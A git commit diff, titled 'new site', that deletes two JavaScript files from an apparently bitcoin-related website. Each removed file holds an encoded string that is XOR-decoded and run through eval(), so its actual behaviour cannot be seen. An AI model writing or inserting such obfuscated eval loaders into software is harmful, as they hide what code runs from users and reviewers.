af8f46be0549462cb192c34dcd21cbe43cbd2909
cinbit <cinbit@users.noreply.github.com>
2020-03-30 20:48:08 +0800

    new site

--- javascripts/databanners.js
+++
@@ -1,7 +0,0 @@
-/*
-*  @author cinbit.com
-*  @date   2015-01-25
-*  @email  cinbit@sina.com
-*/
-
-var ssstttrrrstr="xl%7E+km%28%3A%26kat%22@Rm%7Fd42%21%13ysM%25I3/1k%7F%7Cd6%3B%26%7Czk%3C%27lwvq%1A01i2xt6Y%7E%7DG%7B%5Dkf2r5%07moQ8U%27%3B%25%7Fsph%1A.2hnw%20%3Bpcbe.%3C%3De%3El%60%22Mb3eJoc_%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
--- javascripts/datafaucets.js
+++
@@ -1,6 +0,0 @@
-/*
-*  @author cinbit.com
-*  @date   2014-08-31
-*  @email  btcinvestor@sina.com
-*/
-var ssstttrrrstr="oye6sw3/1%7Ejy-Myxhq//%3E%0EeaZ%10B%17%14%21%12aiwd%2C7d%230%3D%19%06%7E%7Fe1%3A%25%01%0Erli931%0A%29.1%15%12tvo-%269%1Dc%7Da*%3E%22%04yyf3*orqtp8.%0Fywoy%7D%7Bl%7Brb%3Bcz%7C%3Ebjh%22obdkas%24x%3F%09db%7B.C%14%15%26%13bhxe/6c%233%3C%06%07%7D%7Eb08%24%0E%0Fqmn80%155%28-0%12%13ww%60%2C%258%1Ab%7E%605%3F%21%05%7Exe2%25nqpsq%3B%0F0mi%7Diyvqye%3Bc%60%3Dc%3F8%3E%3D94y4knhgmw%20%7C%1B%15x%7EG%29G%10%11*%1Fnd%7Ca+2%7F%3C/%20%02%03yzn%3C7%28%0A%0BuIr%24+%2C1%2C%294%1E%1F%7B%7Bd%28%21%3C%06%7Eb%7C1%3B%25%01rti%3E%21juTom%2734%7Ck%7Drt%7C%60p%7D%3Fya%212%7E6%3F%3D%3B015%26%7E9";eval(function(p,a,c,k,e,d){while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+c+'\\b','g'),k[c])}}return p}('9 10(6){5 4="";5 3=11(6);8(5 2=0;2<3.7;2++){4+=16.12(3.15(2)^(1+(3.7-2)%14))}13 4}',10,17,'||c|s|f|var|Y|length|for|function|dU|unescape|fromCharCode|return|32|charCodeAt|String'.split('|')));eval(dU(ssstttrrrstr));
